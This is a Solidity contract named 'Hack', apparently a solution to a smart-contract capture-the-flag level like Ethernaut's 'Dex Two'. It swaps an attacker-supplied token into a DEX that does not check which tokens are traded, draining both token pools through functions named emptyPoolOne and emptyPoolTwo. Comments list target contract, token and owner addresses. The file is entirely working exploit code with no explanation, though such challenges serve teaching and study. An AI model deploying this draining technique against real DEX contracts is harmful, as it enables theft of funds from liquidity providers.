// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint amount) external;

    function approve(address spender, uint amount) external;

    function balanceOf(address token, address account) external view returns (uint);
}

// 0x4456D68537Fc6d8a535196dCe5B8095A63578BF1 contract address
// 0x10381202d7E5B535763A61Ca6DA8700843f41e8F token 1 // 100   | 10
// 0x1319765d38B523B2D296389aaa0Dd71DBdC086E5 token 2 // 100   | 10

// 0x55BD7E92250903186CEb3938c70F103654a38De1 owner
// 0x8CF294Cd4d724fc97f2e1e309dad12b29957532f token Pina
contract Hack {
    IDex private immutable dex;

    IERC20 public immutable token;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address contractAddress, address tokenAddress) {
        dex = IDex(contractAddress);
        token = IERC20(tokenAddress);
    }

    function setTokenAddress() public {
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
        dex.approve(address(dex), 100);
    }

    function emptyPoolOne(uint amount) public {
        token.approve(address(dex), amount);
        dex.swap(address(token), address(token1), amount);
    }

    function emptyPoolTwo(uint amount) public {
        token.approve(address(dex), amount);
        dex.swap(address(token), address(token2), amount);
    }
}
